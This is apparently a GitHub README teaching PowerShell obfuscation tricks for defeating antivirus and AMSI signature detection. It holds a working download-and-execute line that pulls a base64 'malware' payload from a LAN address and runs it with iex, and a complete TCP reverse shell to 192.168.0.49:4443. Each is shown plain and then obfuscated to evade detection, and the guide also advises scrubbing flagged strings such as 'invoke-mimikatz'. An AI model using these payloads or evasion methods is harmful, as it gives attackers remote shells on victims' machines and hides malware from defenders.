# PowahShell

## Techniques
1. [Randomize Variable Names](#Randomize-Variable-Names)
2. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
3. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
4. [Substitute Loops](#Substitute-Loops)
5. [Substitute Commands](#Substitute-Commands)
6. [Append Random Objects](#Append-Random-Objects)
7. [Append/Remove Comments](#Append\/Remove-Comments)
8. [Randomize Char Cases](#Randomize-Char-Cases)

![image](https://user-images.githubusercontent.com/75489922/231490064-863ab464-84f3-4b38-9c9e-a48c23e3070c.png)

## Obfuscate Boolean Values
It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unlimited. All of the examples below evaluate to `True`. You can reverse them to `False` by simply adding an exclamation mark before the expression (e.g., `![bool]0x01`):
 - Boolean typecast of literally anything that is not 0 or Null will return `True`:
 ```
 [bool]1254
 [bool]0x12AE
 [bool][convert]::ToInt32("111011", 2) # Converts a string to int from base 2 (binary)
 ![bool]$null
 ![bool]$False
 [bool]"Any non empty string"
 [bool](-12354893)   # Boolean typecast of a negative number 
 [bool](12 + (3 * 6))
 ```
 - Boolean typecast of any class will return `True` as well:
 ```
 [bool][bool]
 [bool][char]
 [bool][int] 
 [bool][string]
 [bool][double]
 [bool][short]
 [bool][decimal]
 [bool][byte]
 [bool][timespan]
 [bool][datetime]
 
 [bool][System.Collections.ArrayList]
 [bool][System.Collections.CaseInsensitiveComparer]
 [bool][System.Collections.Hashtable]
 # Well, you get the point.
 ```
 - The result of a comparison that evaluates to `True` (duh):
 ```
 (9999 -eq 9999)
 ([math]::Round([math]::PI) -eq (4583 - 4580))
 [Math]::E -ne [Math]::PI
 ```

 - Boolean type casting something you know will return a value Not equal to 0 (can also be a string, array, etc)
 ```
 [bool](Get-ChildItem -Path Env: | Where-Object {$_.Name -eq "username"})
 [bool]@(0x01BE)
 ```
 - Or you can just grab a `True` value from an object's attributes:
 ```
 $x = [System.Data.AcceptRejectRule].Assembly.GlobalAssemblyCache
 $x = [System.TimeZoneInfo+AdjustmentRule].IsAnsiClass
 $x = [mailaddress].IsAutoLayout
 $x = [ValidateCount].IsVisible
 ```
 - You can mix all these stuff and weird things up by composing hideous ways to state `True` or `False`:
 ```
 [bool](![bool]$null)
 [System.Collections.CaseInsensitiveComparer] -ne [bool][datetime]'2023-01-01'
 ```
 !$False


In loops and comparisons....

## Cmdlet Quote Interruption
You can obfuscate cmdlets by adding single and/or double quotes in between their characters, as long as it's not at the beginning. It's super effective! For example, the expresion `iex "pwd"` can be substituted with:
```
i''ex "pwd"
i''e''x "pwd"
i''e''x'' "pwd"
ie''x'' "pwd"
iex'' "pwd"
i""e''x"" "pwd"
ie""x'' "pwd"

# and so on... but also:

i''ex "p''wd"
i''e''x "p''w''d"
i''e''x'' "p''w''d''"
ie''x'' "pw''d`"`""
iex'' "p`"`"w`"`"d`"`""
i""e''x"" "p`"`"w`"`"d''"
ie""x'' "p`"`"w''d`"`""

# You get the point.
```

## Substitute Loops
There are certain loops that can be substituted with other loop types or functions. For example, a `While ($True){ # some code }` loop can be substituted with the following:
 - An infinite For loop.
 ```
 For (;;) { # some code }
 ```
 - A Do-While loop
 ```
 Do { # some code } While ($true)
 ```
 - A Do-Until loop
 ```
 Do { # some code } Until (1 -eq 2)
 ```
 - A recursive function
 ```
 function runToInfinity { 
   # do something;  
   runToInfinity;
 }
 ```

## Append Random Objects
You can "pollute" a script with random variables and functions. Assume the following script as malicious:  
```
$b64 = $(irm -uri http://192.168.0.66/malware); 
$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
iex $virus;
```

You might be able to break its signature by doing something like:
```
$b64 = $(irm -uri http://192.168.0.66/malware); sleep 0.01;sleep 0.01;Get-Process | Out-Null;
$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));sleep 0.01;sleep 0.01;Measure-Object | Out-Null;
iex $virus;
```

## Substitute Commands
You can always look for commands or even whole code blocks in a script that you can substitute with components that have the same/similar functionality. In the following classic reverse shell script, the `pwd` command is used to retrieve the current working directory and reconstruct the shell's prompt value:  
![image](https://user-images.githubusercontent.com/75489922/231549917-26ec7969-f2ea-4fbc-ae00-931e92947064.png)

The `(pwd).Path` part can be replaced by the following weird, unorthodox little script and although it even includes `pwd` it does serve our purpose of breaking the signature while maintaining the functionality of the script:
```
"$($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p})"
```  
There are of course simpler substitutes for `pwd` like `gl`, `get-location` and `cmd.exe /c chdir` that could do the trick, especially in combination with other techniques.

## Mess With Strings
There's no end to what could someone do with strings. Find below some interesting concepts. Examples use the string `'malware'`:

### Concatenation
Pretty straightforward and classic:
```
'mal' + 'w' + 'ar' + 'e'
```

### Get string from substring:
Add the desired value between an irrelevant string and use `substring()` to extract it based on start - end indexes:
```
'xxxmalwarexxx'.Substring(3,7)
```

### Replace string by regex match:
Create a junk string and replace it with the desired value via regex matching:
```
'a123' -replace '[a-zA-Z]{1}[\d]{1,3}','malware'
```

### Base64 decode the desired string:
Encode your string and decode it within the script:
```
[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("bWFsd2FyZQ=="))
```

### Base64 decode the desired string:
Encode your string and decode it within the script:
```
[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("bWFsd2FyZQ=="))
```

## Append/Remove Comments
### Appending Comments
Obfuscating a script by appending comments here and there might actually do the trick on its own.  
for example, a reverse shell command could be obfuscated like this:

**Original** (Common r-shell command that is easily detected by AVs)  
```$TCPClient = New-Object Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```

**Modified** (appended <# SOME RANDOM COMMENT #> in various places)  
```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```

### Removing Comments
There are malware-ish strings that will trigger AMSI immediately and it should be a priority to replace them, when obfuscating scripts. Check this out:  
![image](https://user-images.githubusercontent.com/75489922/231485178-99aded23-3a7a-46ab-ab30-2a10e5e3a332.png)

Just by typing the string 'invoke-mimikatz' in the terminal AMSI is having a stroke (the script is not even present / loaded). 
These strings may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub).  
  
\*It's generally a good idea to remove comments, this was just an example.

## Randomize Char Cases
Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
```
inVOkE-eXpReSSioN -vErbOse "WHoAmI /aLL" -dEBug
```
